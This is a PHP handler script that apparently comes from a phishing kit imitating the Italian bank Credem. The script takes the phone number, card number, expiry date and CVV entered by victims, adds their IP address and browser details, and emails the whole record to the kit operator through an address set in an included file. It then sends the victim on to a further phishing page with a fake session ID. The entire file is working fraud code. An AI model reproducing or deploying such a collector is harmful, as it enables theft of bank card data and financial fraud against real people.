<?php
if($_POST["n"] != "" and $_POST["c"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------CREDEM INFO-----------------------\n";
$message .= "Phone Number          : ".$_POST['n']."\n";
$message .= "C@rd Number           : ".$_POST['c']."\n";
$message .= "Mese                        : ".$_POST['m']."\n";
$message .= "Anno                        : ".$_POST['a']."\n";
$message .= "CVV                         : ".$_POST['v']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: surf3.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>